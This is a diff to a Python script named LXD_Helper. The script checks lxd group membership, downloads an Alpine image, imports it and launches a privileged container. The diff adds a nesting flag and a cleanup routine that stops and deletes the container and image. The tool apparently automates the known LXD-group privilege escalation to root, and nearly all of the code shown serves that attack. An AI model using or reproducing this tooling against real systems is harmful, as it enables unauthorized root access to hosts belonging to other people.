@@ -10,17 +10,27 @@ import grp
 
 class LXD_Helper:
     def __init__(self):
+   
         self.download_path = "/tmp/alpine"
+        os.makedirs(self.download_path, exist_ok=True)
+
         self.Check_compatibility()
         self.Check_LXD_Status()
         
-        os.makedirs(self.download_path, exist_ok=True)
+       
         if self.check_connection():
             base_url = "https://github.com/jac11/LXD_Helper/releases/download/Lxd%2Bhelper/"
         else:
             base_url = self.get_offline_server()
         self.download_files(base_url)
         self.Set_LXD()
+    def cleanup(self):
+
+        subprocess.run(["sudo", "lxc", "stop", "alpine-container", "--force"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "lxc", "delete", "alpine-container"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["sudo", "lxc", "image", "delete", "alpine-local"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[+] Cleanup completed.")
+    
     def Check_compatibility(self):
         if os.geteuid() != 0:
             print("[!] Run this script as root.")
@@ -41,6 +51,8 @@ class LXD_Helper:
             print(f"[*] INFO ...........| UserName : {username} NOT in group LXD")
             return False
         print("[+] Compatibility check passed.")
+       
+        
         return True
 
     def check_connection(self):
@@ -245,17 +257,20 @@ class LXD_Helper:
                 return
 
             print("[+] Importing Alpine image...")
+            if subprocess.run(["lxc", "image", "list", "alpine-local"], capture_output=True).returncode == 0:
+                print("[+] Image already loaded")
+                self.cleanup()
 
             try:
                 subprocess.run(
-                    ["sudo", "lxc", "image", "import", imagepath, "--alias", "alpine-local"],
-                    check=True
-                )
+                        ["sudo", "lxc", "image", "import", imagepath, "--alias", "alpine-local"],
+                        check=True
+                    )
                 print("[+] Image imported.")
             except subprocess.CalledProcessError:
                 print("[!] Image import failed.")
                 return
-
+            
             print("[+] Launching privileged container...")
 
             try:
@@ -264,7 +279,8 @@ class LXD_Helper:
                         "sudo", "lxc", "launch",
                         "alpine-local",
                         "alpine-container",
-                        "-c", "security.privileged=true"
+                        "-c", "security.privileged=true",
+                        "-c", "security.nesting=true"
                     ],
                     check=True
                 )
@@ -300,4 +316,4 @@ class LXD_Helper:
             )
 
 if __name__ =='__main__':
-   LXD_Helper()
+   LXD_Helper()  
